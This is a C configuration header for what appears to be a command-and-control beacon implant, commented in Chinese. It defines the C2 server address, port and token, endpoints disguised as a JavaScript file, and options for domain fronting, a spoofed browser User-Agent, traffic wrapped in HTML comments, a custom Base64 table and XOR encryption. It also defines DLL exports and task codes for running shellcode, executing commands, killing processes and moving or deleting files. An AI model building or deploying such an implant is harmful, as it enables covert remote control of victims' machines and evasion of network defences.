#ifndef CONFIG_H
#define CONFIG_H

// 编译模式配置
// 定义 BUILD_DLL 来编译成DLL，否则编译成EXE
// #define BUILD_DLL

// Beacon版本信息
#define BEACON_VERSION "1.0.0"

// 调试开关：0 关闭（默认），1 开启
#ifndef ENABLE_DEBUG
#define ENABLE_DEBUG 0
#endif

// 轻量日志宏：发布构建中会被编译器优化掉
#if ENABLE_DEBUG
#include <stdio.h>
#define LOG_DEBUG(...) do { printf(__VA_ARGS__); } while(0)
#else
#define LOG_DEBUG(...) do { } while(0)
#endif

// 可选：自定义 User-Agent（为空则使用默认）
#define CUSTOM_USER_AGENT L"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/qwe.36 (KHTML, like Gecko) Chrome/qwe.0.0.0 Safari/qwe.36"

// 可选：自定义 Host 头（域前置时设置为前置域；为空则不覆盖）
#define CUSTOM_HOST_HEADER L""

// 服务器配置
#define SERVER_HOST L"127.0.0.1"
#define SERVER_PORT 8084
#define USE_HTTPS 0             // 启用HTTPS (0=HTTP, 1=HTTPS)
#define HTTPS_PORT 8443          // HTTPS端口

// 通信配置
#define INITIAL_SLEEP_TIME 10
#define RETRY_INTERVAL 60
#define MAX_RETRIES 3
#define CLIENT_TOKEN L"QWERTYUIOPASDF"

// 端点配置 - 与服务器config.json中的routes配置对应
#define API_ENDPOINT L"/asdasd/j.js"        // 对应 beacon_endpoint
#define REGISTER_ENDPOINT L"/sync_debug"  // 对应 register_path

// 编码配置
#define USE_CUSTOM_BASE64 1  // 启用自定义Base64编码表
#define CUSTOM_BASE64_TABLE "QWERTYUIOPASDFGHJKLZXCVBNMqwertyuiopasdfghjklzxcvbnm0123456789+/"

// 流量伪装配置
#define ENABLE_TRAFFIC_DISGUISE 1  // 启用流量伪装
#define TRAFFIC_PREFIX "<!--"      // 数据前缀
#define TRAFFIC_SUFFIX "-->"       // 数据后缀

// 系统配置
#define REG_PATH L"SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion"

// 缓冲区大小配置
#define MAX_BUFFER_SIZE (10 * 1024 * 1024)  // 10MB，支持大型进程列表
#define INITIAL_BUFFER_SIZE (8 * 1024)      // 8KB
#define MAX_PATH_LENGTH 2048
#define UUID_LENGTH 37

// ===== 加解密密钥配置 =====
// 使用固定密钥替换原先的 ProductId（OS UUID）密钥
// 注意：同时在发送端（测试脚本/服务端）使用相同密钥
#ifndef XOR_FIXED_KEY
#define XOR_FIXED_KEY "CHANGE_ME_FIXED_KEY"
#endif

// DLL导出函数名称
#ifdef BUILD_DLL
#define EXPORT_FUNCTION_NAME "StartBeacon"
#define EXPORT_STOP_FUNCTION_NAME "StopBeacon"
#endif

// 任务类型定义
typedef enum {
    TASK_NULL = 0x00,
    TASK_SLEEP = 0x1A,
    TASK_PROCLIST = 0x1B,
    TASK_SHELLCODE = 0x1C,
    TASK_EXECUTE = 0x1D,
    TASK_PROC_KILL = 0x1E,
    TASK_FILE_LIST = 0x21,
    TASK_FILE_DOWNLOAD = 0x22,
    TASK_FILE_UPLOAD = 0x23,
    TASK_FILE_DELETE = 0x24,
    TASK_FILE_MKDIR = 0x25,
    TASK_FILE_INFO = 0x26,
    TASK_UNKNOWN = 0xFF
} TASK_TYPE;

// 错误码定义
typedef enum {
    BEACON_SUCCESS = 0,
    BEACON_ERROR_PARAMS = 1,
    BEACON_ERROR_MEMORY = 2,
    BEACON_ERROR_NETWORK = 3,
    BEACON_ERROR_SYSTEM = 4,
    BEACON_ERROR_SERVER_SHUTDOWN = 5
} BEACON_ERROR;

#endif // CONFIG_H 